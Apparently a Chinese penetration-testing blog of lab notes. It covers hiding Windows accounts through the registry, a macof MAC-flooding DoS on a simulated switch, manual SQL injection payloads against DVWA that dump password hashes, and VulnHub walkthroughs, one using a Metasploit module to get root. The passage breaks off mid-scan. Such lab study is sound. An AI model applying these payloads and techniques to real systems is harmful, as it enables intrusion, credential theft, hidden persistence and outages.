<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222254325.png" alt="image-20220721222254325"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222347466.png" alt="image-20220721222347466"></p>
<p>鼠标右击Winlogon ,在弹出的菜单中点击 新建-项 输入SpecialAccounts 按回车，鼠标右击SpecialAccounts，再次新建项输入 UserList 。新建完以后如图。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222557106.png" alt="image-20220721222557106"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222631453.png" alt="image-20220721222631453"></p>
<p>之后鼠标右击 UserList -新建-DWORD值。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222738754.png" alt="image-20220721222738754"></p>
<p>输入你要隐藏的账户名称，如果还要添加其它账户，可以再次新建DWORD值即可。现在你可以重启一次电脑看看，账户是不是已经隐藏了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222949327.png" alt="image-20220721222949327"></p>
<p>输入你要隐藏的账户名称，如果还要添加其它账户，可以再次新建DWORD值即可。现在你可以重启一次电脑看看，账户是不是已经隐藏了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-07-21_22-01-47.png" alt="Snipaste_2022-07-21_22-01-47"></p>
<p>再狗一点，我们把隐藏账号做成影子账号</p>
<h3 id="dos一下ensp的交换机"><a href="#dos一下ensp的交换机" class="headerlink" title="dos一下ensp的交换机"></a>dos一下ensp的交换机</h3><p><strong>本次实验有两台设备，Kali Linux(攻击机) ip:192.168.110.132、Windows 10(靶机) ip:192.168.110.133、Windows 10(靶机)的ensp里面的PC1 ip:192.168.110.130、PC2 ip:192.168.110.131</strong></p>
<p><strong>注意：实验前确认靶机的防火墙已经被关闭</strong></p>
<p><strong>在kali linux(攻击机)上事先安装好<code>dsniff</code>,因为下面要用到dsniff里面的<code>macof</code>泛洪来填满交换机小小的内存,使交换机无法让<code>PC1</code>和<code>PC2</code>收发信息</strong></p>
<p><strong>Windows 10(靶机)要提前安装好<code>ensp</code></strong></p>
<p><strong>kali安装dsniff</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dsniff</span><br></pre></td></tr></table></figure>

<p><strong>安装完成之后，让所有的机子关闭，在<code>虚拟网络编辑器</code>里面创建<code>VMnet2</code>的<code>仅主机模式</code>并且修改子网IP在<code>192.168.110.0</code>即可。</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927163830934.png" alt="image-20230927163830934"></p>
<p><strong>然后Kali Linux(攻击机)、Windows 10(靶机)都接入<code>VMnet2</code>里</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927164240231.png" alt="image-20230927164240231"></p>
<p>启动kali和Windows 10(靶机),Windows 10(靶机)打开<code>ensp</code>，按照下图这样设计</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927170102580.png" alt="image-20230927170102580"></p>
<p><strong>然后，这个小云朵要桥接到Windows 10(靶机)的真实网卡接口</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927170221445.png" alt="image-20230927170221445"></p>
<p>让<code>PC1</code>和<code>PC2</code>直接<code>dhcp</code>算了</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927170705164.png" alt="image-20230927170705164"></p>
<p><strong>让PC1一直 <code>ping</code> PC2,然后看一眼交换机的<code>mac</code>表</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.110.131 -t</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927170856902.png" alt="image-20230927170856902"></p>
<p><strong>这个时候，直接开启kali的最高权限输入<code>macof</code>就可以看到断网现象</strong></p>
<p><strong>下图是交换机被塞得满满的图</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927173759044.png" alt="image-20230927173759044"></p>
<p><strong>交换机直接宕机图</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927173936063.png" alt="image-20230927173936063"></p>
<p><strong>这个图是模拟器有问题，正确的应该是PC1ping不通PC2，然后一段时间后交换机重启又可以ping通，然后又挂。。。</strong></p>
<p><strong>我这个图线路都全挂了还能ping通就极度离谱</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20230927174200188.png" alt="image-20230927174200188"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><h5 id="安装phpstudy"><a href="#安装phpstudy" class="headerlink" title="安装phpstudy"></a>安装phpstudy</h5><h5 id="下载DVWA源码"><a href="#下载DVWA源码" class="headerlink" title="下载DVWA源码"></a>下载DVWA源码</h5><h5 id="安装需要的依赖库"><a href="#安装需要的依赖库" class="headerlink" title="安装需要的依赖库"></a>安装需要的依赖库</h5><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p>1.这里把<code>DVWA</code>源码解压到<code>phpstudy</code>的<code>WWW</code>目录中，然后修改DVWA的配置文件目录config里面的<code>config.inc.php.dist</code>,将其重命名为<code>config.inc.php</code>。</p>
<p>2.编辑<code>config.inc.php</code>文件 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># phpstudy的默认用户和密码都是root，所以只需要修改这个即可。</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;root&#x27;</span>;       </span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>修改完成之后，重启phpstudy，然后登陆浏览器<code>localhost/DVWA目录名字</code>即可看到网站，然后点击里面的<code>Create/Reset Datebase</code>即可完成。</p>
<p>登录DVWA，默认用户是<code>admin</code>，密码是<code>password</code></p>
<p>这里有个地方需要小小滴小改一下，那就是<code>难度</code></p>
<p>登录进去之后找到<code>DVWA Security</code>里面有四个难度，从低到高分别是low、Medium、High、Impossible</p>
<h4 id="SQL注入-手工注入"><a href="#SQL注入-手工注入" class="headerlink" title="SQL注入(手工注入)"></a>SQL注入(手工注入)</h4><h5 id="low级"><a href="#low级" class="headerlink" title="low级"></a>low级</h5><p>首先，判断字符型注入还是数字型注入</p>
<p>1.一般可以通过直接输入单引号来判断是否存在注入点</p>
<p>2.也可以通过输入3和1+2判断注入为字符型注入，若为数字型注入，则3和1+2输出一样</p>
<p>那么我们先输入一个3得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 3</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br></pre></td></tr></table></figure>

<p>然后输入2+1得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 2+1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br></pre></td></tr></table></figure>

<p>可以判断出这是字符型注入</p>
<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码</p>
<blockquote>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘$id’</p>
</blockquote>
<ul>
<li><p>‘ or 1&#x3D;1 or ‘ </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘ ‘ or 1&#x3D;1 or ‘ ‘ </p>
<p>False or True or False</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line">ID: 1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; =&#x27;</span>1</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br></pre></td></tr></table></figure>

<ul>
<li><p>1’ or ‘1’ &#x3D;’1 </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘1’ or ‘1’ &#x3D;’1’ </p>
<p>True or True</p>
</li>
<li><p>‘or 1&#x3D;1 # </p>
<p>SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘’or 1&#x3D;1 #’</p>
<p># 为注释</p>
<p>False or True</p>
</li>
<li><p>‘or 1&#x3D;1 –  SELECT first_name, last_name FROM users WHERE user_id &#x3D; ‘’or 1&#x3D;1 – ‘ </p>
<p>– （有空格）也是注释 </p>
<p>False or True</p>
</li>
</ul>
</li>
</ul>
<p>3.猜SQL查询语句的字段数</p>
<ul>
<li>1’ order by 2 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; order by 2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br></pre></td></tr></table></figure>

<ul>
<li>1’ order by 3 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column <span class="string">&#x27;3&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以判断数据库字段数为2</p>
<ul>
<li>1’ union select 1,2 #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ID: 1<span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> union select 1,2 <span class="comment">#</span></span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure>

<p>4.查询当前用户名和数据库</p>
<ul>
<li>1’ union select user(),database() #</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 查询当前用户名和数据库 1<span class="string">&#x27; union select user(),database() #</span></span><br><span class="line"><span class="string">First name: root@localhost</span></span><br><span class="line"><span class="string">Surname: dvwa</span></span><br></pre></td></tr></table></figure>

<p>5.获取数据库中的表</p>
<ul>
<li>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取数据库中的表 1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: guestbook,users</span></span><br></pre></td></tr></table></figure>

<p>6.获取表中的字段名</p>
<ul>
<li>1’ union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取表中的字段名 1<span class="string">&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span></span><br></pre></td></tr></table></figure>

<p>7.获取字段中的数据</p>
<ul>
<li>1’ union select user,password from users#</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: 1337</span></span><br><span class="line"><span class="string">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 获取字段中的数据 1&#x27;</span> union select user,password from <span class="built_in">users</span><span class="comment">#</span></span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 获取字段中的数据 1<span class="string">&#x27; union select user,password from users#</span></span><br><span class="line"><span class="string">First name: smithy</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h5 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h5><h3 id="driftingblues7-vh"><a href="#driftingblues7-vh" class="headerlink" title="driftingblues7_vh"></a>driftingblues7_vh</h3><p>kali ip :</p>
<blockquote>
<p>192.168.228.128</p>
</blockquote>
<p>靶机 ip ：</p>
<blockquote>
<p>192.168.228.129</p>
</blockquote>
<p>开启driftingblues7_vh，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 192.168.228.0/24</span><br></pre></td></tr></table></figure>

<p>找到目标ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829104221720.png" alt="image-20220829104221720"></p>
<p>利用nmap对靶机进行二次扫描，找靶机开放的服务和端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -T4 192.168.228.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829104712673.png" alt="image-20220829104712673"></p>
<p>在浏览器打开靶机的web的页面看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829105011222.png" alt="image-20220829105011222"></p>
<p>扫描一下靶机web的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://192.168.228.129/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829105454907.png" alt="image-20220829105454907"></p>
<p>我们也可以使用这个来扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u  https://192.168.228.129/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829110452593.png" alt="image-20220829110452593"></p>
<p>在<a target="_blank" rel="noopener" href="https://192.168.228.129/bower.json%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0">https://192.168.228.129/bower.json里面可以发现</a> Eyes Of Network 版本 5.3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit EyesOfNetwork 5.3</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829110917888.png" alt="image-20220829110917888"></p>
<p>我们进入到 msfconsole </p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111055118.png" alt="image-20220829111055118"></p>
<p>查找EyesOfNetwork的漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search EyesOfNetwork</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111218183.png" alt="image-20220829111218183"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111304610.png" alt="image-20220829111304610"></p>
<p>然后设定靶机IP为192.168.228.129，kali端ip为192.168.228.128</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.228.129</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.228.128</span><br></pre></td></tr></table></figure>

<p>执行run</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111741201.png" alt="image-20220829111741201"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829111837231.png" alt="image-20220829111837231"></p>
<p>额。。。大无语，就这样结束了！！！</p>
<h3 id="Prime-Series-Level-1"><a href="#Prime-Series-Level-1" class="headerlink" title="Prime_Series_Level-1"></a>Prime_Series_Level-1</h3><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/prime/Prime_Series_Level-1.rar">下载地址</a></p>
<p>解压<code>Prime_Series_Level-1.rar</code>打开虚拟机，kali就绪</p>
<h4 id="扫描c类网段"><a href="#扫描c类网段" class="headerlink" title="扫描c类网段"></a>扫描c类网段</h4><p>kali和靶机都在192.168.110.0&#x2F;24这个段内，直接进行arp扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># arp-scan 192.168.110.0/24</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:91:4e:61, IPv4: 192.168.110.135</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.110.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.110.2	00:50:56:<span class="built_in">fc</span>:59:41	VMware, Inc.</span><br><span class="line">192.168.110.139	00:0c:29:c0:1f:7f	VMware, Inc.</span><br><span class="line">192.168.110.254	00:50:56:f3:bc:e9	VMware, Inc.</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 2.026 seconds (126.36 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<p>可以看出192.168.110.139是目标靶机的ip，为保确认我们用nmap看看它的端口号和系统是不是ubuntu</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># nmap -sT -A 192.168.110.139</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-30 22:15 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.110.139</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:<span class="built_in">cd</span>:4d:2d:4d:72 (RSA)</span><br><span class="line">|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)</span><br><span class="line">|_  256 4b:f6:f1:25:b6:13:26:d4:<span class="built_in">fc</span>:9e:b0:72:9f:f4:69:68 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: HacknPentest</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:C0:1F:7F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.110.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.69 seconds</span><br></pre></td></tr></table></figure>

<p>由nmap扫描的结果可以知道是ubuntu系统而且开启了22和80端口</p>
<p>浏览器输入靶机ip看看有什么网址。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731102259616.png" alt="image-20220731102259616"></p>
<p>额。。。作者挺喜欢简洁风啊</p>
<h4 id="扫描网址目录地址"><a href="#扫描网址目录地址" class="headerlink" title="扫描网址目录地址"></a>扫描网址目录地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># dirb http://192.168.110.139                  </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 30 22:24:32 2022</span><br><span class="line">URL_BASE: http://192.168.110.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.110.139/ ----</span><br><span class="line">+ http://192.168.110.139/dev (CODE:200|SIZE:131)                                                                                  </span><br><span class="line">+ http://192.168.110.139/index.php (CODE:200|SIZE:136)                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/javascript/                                                                                 </span><br><span class="line">+ http://192.168.110.139/server-status (CODE:403|SIZE:303)                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/                                                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/javascript/jquery/                                                                          </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/index.php (CODE:301|SIZE:0)                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/                                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-includes/                                                                      </span><br><span class="line">+ http://192.168.110.139/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/javascript/jquery/ ----</span><br><span class="line">+ http://192.168.110.139/javascript/jquery/jquery (CODE:200|SIZE:284394)                                                          </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/css/                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/images/                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/includes/                                                                </span><br><span class="line">+ 